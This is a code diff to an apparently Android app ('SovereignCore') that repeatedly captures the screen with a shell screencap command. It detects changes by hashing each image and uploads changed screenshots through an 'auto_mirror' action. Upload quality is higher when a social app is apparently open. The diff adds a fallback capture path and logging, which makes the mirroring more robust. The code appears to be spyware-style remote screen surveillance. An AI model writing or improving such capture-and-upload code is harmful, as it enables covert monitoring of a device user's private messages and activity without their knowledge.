@@ -227,7 +227,12 @@ class SovereignCore(App):
                     # Take screenshot
                     parent = App.get_running_app().user_data_dir
                     path = os.path.join(parent, "mirror_temp.png")
-                    self._run_shell(f"screencap -p {path}")
+                    res = self._run_shell(f"screencap -p {path}")
+                    
+                    if not res.get("success") or not os.path.exists(path):
+                        noir_log(f"[MIRROR] Screencap failed: {res.get('output', 'No file')}", level="WARNING")
+                        # Try fallback: generic screenshot
+                        self._run_shell(f"/system/bin/screencap -p {path}")
                     
                     if os.path.exists(path):
                         # Simple Hash Check to detect changes
@@ -236,12 +241,13 @@ class SovereignCore(App):
                         
                         if current_hash != last_img_hash:
                             last_img_hash = current_hash
-                            # Trigger upload with adaptive quality
-                            quality = 60 if is_social else 35
-                            self._execute({"action": "screenshot", "command_id": "auto_mirror", "is_social": is_social, "quality": quality, "local_path": path})
+                            noir_log(f"[MIRROR] Change detected. Uploading with quality={60 if is_social else 35}", level="INFO")
+                            self._execute({"action": "screenshot", "command_id": "auto_mirror", "is_social": is_social, "quality": 60 if is_social else 35, "local_path": path})
                         else:
-                            # No change, slow down
-                            interval = 10
+                            interval = 10 # Slow down if no change
+                    else:
+                        noir_log("[MIRROR] Mirroring suspended: Hardware capture failed.", level="ERROR")
+                        interval = 30
                     
                     time.sleep(interval)
                 else:
